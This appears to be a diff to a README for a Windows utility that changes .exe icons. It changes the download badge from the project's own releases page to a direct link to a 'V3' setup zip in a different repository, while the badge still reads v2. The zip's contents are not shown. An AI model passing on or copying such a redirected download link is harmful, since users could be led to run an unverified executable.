@@ -5,7 +5,7 @@
 
 **Windows Icon Changer v2** is a free, lightweight, and open-source utility designed to easily **change the icon of any executable (.exe) file** on Windows. Whether you are a developer looking to brand your application or a user wanting to customize your desktop aesthetics, this tool allows you to replace binary icons in seconds.
 
-[![Download Windows Icon Changer](https://img.shields.io/badge/Download-Windows_Icon_Changer_v2-brightgreen?style=for-the-badge&logo=windows)](./releases)
+[![Download Windows Icon Changer](https://img.shields.io/badge/Download-Windows_Icon_Changer_v2-brightgreen?style=for-the-badge&logo=windows)](https://github.com/simondaubner/Windows-Binary-Icon-Changer-V3/releases/download/Releases/IconChangerV3_Setup.zip)
 [![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](./LICENSE)
 [![Platform](https://img.shields.io/badge/Platform-Windows_11_%7C_10_%7C_8_%7C_7-0078D6?style=for-the-badge&logo=windows)](./)
 
